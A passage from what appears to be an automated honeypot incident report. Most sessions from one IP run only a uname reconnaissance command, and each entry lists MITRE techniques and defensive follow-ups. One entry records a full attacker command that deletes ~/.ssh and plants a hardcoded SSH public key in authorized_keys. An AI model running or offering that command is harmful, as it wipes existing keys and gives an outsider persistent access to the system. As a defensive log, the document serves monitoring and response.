| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:04:37` | `cowrie.session.connect` |
| `2026-07-04 15:04:37` | `cowrie.client.version` |
| `2026-07-04 15:04:37` | `cowrie.client.kex` |
| `2026-07-04 15:04:38` | `cowrie.login.success` |
| `2026-07-04 15:04:38` | `cowrie.session.params` |
| `2026-07-04 15:04:38` | `cowrie.command.input` |
| `2026-07-04 15:04:39` | `cowrie.log.closed` |
| `2026-07-04 15:04:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec8f4aafc837

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:04 |
| **Last Seen** | 2026-07-04 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:04:41` | `cowrie.session.connect` |
| `2026-07-04 15:04:41` | `cowrie.client.version` |
| `2026-07-04 15:04:41` | `cowrie.client.kex` |
| `2026-07-04 15:04:41` | `cowrie.login.success` |
| `2026-07-04 15:04:42` | `cowrie.session.params` |
| `2026-07-04 15:04:42` | `cowrie.command.input` |
| `2026-07-04 15:04:42` | `cowrie.log.closed` |
| `2026-07-04 15:04:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91091415c5da

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:04 |
| **Last Seen** | 2026-07-04 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:04:44` | `cowrie.session.connect` |
| `2026-07-04 15:04:44` | `cowrie.client.version` |
| `2026-07-04 15:04:44` | `cowrie.client.kex` |
| `2026-07-04 15:04:44` | `cowrie.login.success` |
| `2026-07-04 15:04:45` | `cowrie.session.params` |
| `2026-07-04 15:04:45` | `cowrie.command.input` |
| `2026-07-04 15:04:45` | `cowrie.log.closed` |
| `2026-07-04 15:04:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33a9c7cb5284

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:04 |
| **Last Seen** | 2026-07-04 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:04:47` | `cowrie.session.connect` |
| `2026-07-04 15:04:47` | `cowrie.client.version` |
| `2026-07-04 15:04:48` | `cowrie.client.kex` |
| `2026-07-04 15:04:48` | `cowrie.login.success` |
| `2026-07-04 15:04:49` | `cowrie.session.params` |
| `2026-07-04 15:04:49` | `cowrie.command.input` |
| `2026-07-04 15:04:49` | `cowrie.log.closed` |
| `2026-07-04 15:04:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8bc37584cd1

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:04 |
| **Last Seen** | 2026-07-04 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:04:51` | `cowrie.session.connect` |
| `2026-07-04 15:04:51` | `cowrie.client.version` |
| `2026-07-04 15:04:51` | `cowrie.client.kex` |
| `2026-07-04 15:04:51` | `cowrie.login.success` |
| `2026-07-04 15:04:52` | `cowrie.session.params` |
| `2026-07-04 15:04:52` | `cowrie.command.input` |
| `2026-07-04 15:04:52` | `cowrie.log.closed` |
| `2026-07-04 15:04:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54fd0776ac53

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:04 |
| **Last Seen** | 2026-07-04 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:04:54` | `cowrie.session.connect` |
| `2026-07-04 15:04:54` | `cowrie.client.version` |
| `2026-07-04 15:04:54` | `cowrie.client.kex` |
| `2026-07-04 15:04:55` | `cowrie.login.success` |
| `2026-07-04 15:04:55` | `cowrie.session.params` |
| `2026-07-04 15:04:55` | `cowrie.command.input` |
| `2026-07-04 15:04:55` | `cowrie.log.closed` |
| `2026-07-04 15:04:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e53e093e84e5

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:04 |
| **Last Seen** | 2026-07-04 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:04:58` | `cowrie.session.connect` |
| `2026-07-04 15:04:58` | `cowrie.client.version` |
| `2026-07-04 15:04:58` | `cowrie.client.kex` |
| `2026-07-04 15:04:58` | `cowrie.login.success` |
| `2026-07-04 15:04:59` | `cowrie.session.params` |
| `2026-07-04 15:04:59` | `cowrie.command.input` |
| `2026-07-04 15:04:59` | `cowrie.log.closed` |
| `2026-07-04 15:04:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b12e0afe494

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:05 |
| **Last Seen** | 2026-07-04 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:05:01` | `cowrie.session.connect` |
| `2026-07-04 15:05:01` | `cowrie.client.version` |
| `2026-07-04 15:05:01` | `cowrie.client.kex` |
| `2026-07-04 15:05:01` | `cowrie.login.success` |
| `2026-07-04 15:05:02` | `cowrie.session.params` |
| `2026-07-04 15:05:02` | `cowrie.command.input` |
| `2026-07-04 15:05:02` | `cowrie.log.closed` |
| `2026-07-04 15:05:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-025d62acff16

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:05 |
| **Last Seen** | 2026-07-04 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:05:04` | `cowrie.session.connect` |
| `2026-07-04 15:05:04` | `cowrie.client.version` |
| `2026-07-04 15:05:04` | `cowrie.client.kex` |
| `2026-07-04 15:05:05` | `cowrie.login.success` |
| `2026-07-04 15:05:05` | `cowrie.session.params` |
| `2026-07-04 15:05:05` | `cowrie.command.input` |
| `2026-07-04 15:05:06` | `cowrie.log.closed` |
| `2026-07-04 15:05:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff1fae21d2dc

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:05 |
| **Last Seen** | 2026-07-04 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:05:08` | `cowrie.session.connect` |
| `2026-07-04 15:05:08` | `cowrie.client.version` |
| `2026-07-04 15:05:08` | `cowrie.client.kex` |
| `2026-07-04 15:05:08` | `cowrie.login.success` |
| `2026-07-04 15:05:09` | `cowrie.session.params` |
| `2026-07-04 15:05:09` | `cowrie.command.input` |
| `2026-07-04 15:05:09` | `cowrie.log.closed` |
| `2026-07-04 15:05:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4df448aa6a3

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:05 |
| **Last Seen** | 2026-07-04 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:05:11` | `cowrie.session.connect` |
| `2026-07-04 15:05:11` | `cowrie.client.version` |
| `2026-07-04 15:05:11` | `cowrie.client.kex` |
| `2026-07-04 15:05:12` | `cowrie.login.success` |
| `2026-07-04 15:05:12` | `cowrie.session.params` |
| `2026-07-04 15:05:12` | `cowrie.command.input` |
| `2026-07-04 15:05:12` | `cowrie.log.closed` |
| `2026-07-04 15:05:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34729d02a363

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:05 |
| **Last Seen** | 2026-07-04 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:05:14` | `cowrie.session.connect` |
| `2026-07-04 15:05:14` | `cowrie.client.version` |
| `2026-07-04 15:05:15` | `cowrie.client.kex` |
| `2026-07-04 15:05:15` | `cowrie.login.success` |
| `2026-07-04 15:05:16` | `cowrie.session.params` |
| `2026-07-04 15:05:16` | `cowrie.command.input` |
| `2026-07-04 15:05:16` | `cowrie.log.closed` |
| `2026-07-04 15:05:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dda6ace5349

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:05 |
| **Last Seen** | 2026-07-04 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:05:18` | `cowrie.session.connect` |
| `2026-07-04 15:05:18` | `cowrie.client.version` |
| `2026-07-04 15:05:18` | `cowrie.client.kex` |
| `2026-07-04 15:05:18` | `cowrie.login.success` |
| `2026-07-04 15:05:19` | `cowrie.session.params` |
| `2026-07-04 15:05:19` | `cowrie.command.input` |
| `2026-07-04 15:05:19` | `cowrie.log.closed` |
| `2026-07-04 15:05:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30b3e5f06e7a

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:05 |
| **Last Seen** | 2026-07-04 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:05:21` | `cowrie.session.connect` |
| `2026-07-04 15:05:21` | `cowrie.client.version` |
| `2026-07-04 15:05:21` | `cowrie.client.kex` |
| `2026-07-04 15:05:22` | `cowrie.login.success` |
| `2026-07-04 15:05:22` | `cowrie.session.params` |
| `2026-07-04 15:05:22` | `cowrie.command.input` |
| `2026-07-04 15:05:22` | `cowrie.log.closed` |
| `2026-07-04 15:05:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7917e22e649a

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:05 |
| **Last Seen** | 2026-07-04 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:05:25` | `cowrie.session.connect` |
| `2026-07-04 15:05:25` | `cowrie.client.version` |
| `2026-07-04 15:05:25` | `cowrie.client.kex` |
| `2026-07-04 15:05:25` | `cowrie.login.success` |
| `2026-07-04 15:05:26` | `cowrie.session.params` |
| `2026-07-04 15:05:26` | `cowrie.command.input` |
| `2026-07-04 15:05:26` | `cowrie.log.closed` |
| `2026-07-04 15:05:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c746c3f4c87

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:05 |
| **Last Seen** | 2026-07-04 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:05:28` | `cowrie.session.connect` |
| `2026-07-04 15:05:28` | `cowrie.client.version` |
| `2026-07-04 15:05:28` | `cowrie.client.kex` |
| `2026-07-04 15:05:29` | `cowrie.login.success` |
| `2026-07-04 15:05:29` | `cowrie.session.params` |
| `2026-07-04 15:05:29` | `cowrie.command.input` |
| `2026-07-04 15:05:29` | `cowrie.log.closed` |
| `2026-07-04 15:05:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f0fbd1b977d

| Field | Detail |
|---|---|
| **Source IP** | `101.126.88[.]251` |
| **First Seen** | 2026-07-04 15:05 |
| **Last Seen** | 2026-07-04 15:05 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:05:29` | `cowrie.session.connect` |
| `2026-07-04 15:05:30` | `cowrie.client.version` |
| `2026-07-04 15:05:30` | `cowrie.client.kex` |
| `2026-07-04 15:05:31` | `cowrie.login.success` |
| `2026-07-04 15:05:32` | `cowrie.session.params` |
| `2026-07-04 15:05:32` | `cowrie.command.input` |
| `2026-07-04 15:05:32` | `cowrie.command.failed` |
| `2026-07-04 15:05:33` | `cowrie.log.closed` |
| `2026-07-04 15:05:34` | `cowrie.session.params` |
| `2026-07-04 15:05:34` | `cowrie.command.input` |
| `2026-07-04 15:05:34` | `cowrie.session.file_download` |
| `2026-07-04 15:05:34` | `cowrie.log.closed` |
| `2026-07-04 15:05:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.88[.]251` to AbuseIPDB if not already reported
- [ ] Block `101.126.88[.]251` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f17815d60e6

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:05 |
| **Last Seen** | 2026-07-04 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:05:32` | `cowrie.session.connect` |
| `2026-07-04 15:05:32` | `cowrie.client.version` |
| `2026-07-04 15:05:32` | `cowrie.client.kex` |
| `2026-07-04 15:05:32` | `cowrie.login.success` |
| `2026-07-04 15:05:33` | `cowrie.session.params` |
| `2026-07-04 15:05:33` | `cowrie.command.input` |
| `2026-07-04 15:05:33` | `cowrie.log.closed` |
| `2026-07-04 15:05:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-892198e11343

| Field | Detail |
|---|---|
| **Source IP** | `101.126.88[.]251` |
| **First Seen** | 2026-07-04 15:05 |
| **Last Seen** | 2026-07-04 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:05:35` | `cowrie.session.connect` |
| `2026-07-04 15:05:35` | `cowrie.client.version` |
| `2026-07-04 15:05:35` | `cowrie.client.kex` |
| `2026-07-04 15:05:36` | `cowrie.login.success` |
| `2026-07-04 15:05:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.88[.]251` to AbuseIPDB if not already reported
- [ ] Block `101.126.88[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e613677ed27

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:05 |
| **Last Seen** | 2026-07-04 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:05:35` | `cowrie.session.connect` |
| `2026-07-04 15:05:35` | `cowrie.client.version` |
| `2026-07-04 15:05:35` | `cowrie.client.kex` |
| `2026-07-04 15:05:35` | `cowrie.login.success` |
| `2026-07-04 15:05:36` | `cowrie.session.params` |
| `2026-07-04 15:05:36` | `cowrie.command.input` |
| `2026-07-04 15:05:36` | `cowrie.log.closed` |
| `2026-07-04 15:05:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46ec8479f0da

| Field | Detail |
|---|---|
| **Source IP** | `101.126.88[.]251` |
| **First Seen** | 2026-07-04 15:05 |
| **Last Seen** | 2026-07-04 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:05:37` | `cowrie.session.connect` |
| `2026-07-04 15:05:37` | `cowrie.client.version` |
| `2026-07-04 15:05:37` | `cowrie.client.kex` |
| `2026-07-04 15:05:38` | `cowrie.login.success` |
| `2026-07-04 15:05:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.88[.]251` to AbuseIPDB if not already reported
- [ ] Block `101.126.88[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ccca01b1997

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:05 |
| **Last Seen** | 2026-07-04 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:05:38` | `cowrie.session.connect` |
| `2026-07-04 15:05:38` | `cowrie.client.version` |
| `2026-07-04 15:05:38` | `cowrie.client.kex` |
| `2026-07-04 15:05:39` | `cowrie.login.success` |
| `2026-07-04 15:05:40` | `cowrie.session.params` |
| `2026-07-04 15:05:40` | `cowrie.command.input` |
| `2026-07-04 15:05:40` | `cowrie.log.closed` |
| `2026-07-04 15:05:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56b9354ec0c5

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:05 |
| **Last Seen** | 2026-07-04 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:05:42` | `cowrie.session.connect` |
| `2026-07-04 15:05:42` | `cowrie.client.version` |
| `2026-07-04 15:05:42` | `cowrie.client.kex` |
| `2026-07-04 15:05:42` | `cowrie.login.success` |
| `2026-07-04 15:05:43` | `cowrie.session.params` |
| `2026-07-04 15:05:43` | `cowrie.command.input` |
| `2026-07-04 15:05:43` | `cowrie.log.closed` |
| `2026-07-04 15:05:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bf6a2f44332

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:05 |
| **Last Seen** | 2026-07-04 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:05:45` | `cowrie.session.connect` |
| `2026-07-04 15:05:45` | `cowrie.client.version` |
| `2026-07-04 15:05:45` | `cowrie.client.kex` |
| `2026-07-04 15:05:45` | `cowrie.login.success` |
| `2026-07-04 15:05:46` | `cowrie.session.params` |
| `2026-07-04 15:05:46` | `cowrie.command.input` |
| `2026-07-04 15:05:46` | `cowrie.log.closed` |
| `2026-07-04 15:05:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05ad0d1f44d0

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:05 |
| **Last Seen** | 2026-07-04 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:05:48` | `cowrie.session.connect` |
| `2026-07-04 15:05:48` | `cowrie.client.version` |
| `2026-07-04 15:05:48` | `cowrie.client.kex` |
| `2026-07-04 15:05:49` | `cowrie.login.success` |
| `2026-07-04 15:05:50` | `cowrie.session.params` |
| `2026-07-04 15:05:50` | `cowrie.command.input` |
| `2026-07-04 15:05:50` | `cowrie.log.closed` |
| `2026-07-04 15:05:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14faf3d58909

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:05 |
| **Last Seen** | 2026-07-04 15:05 |
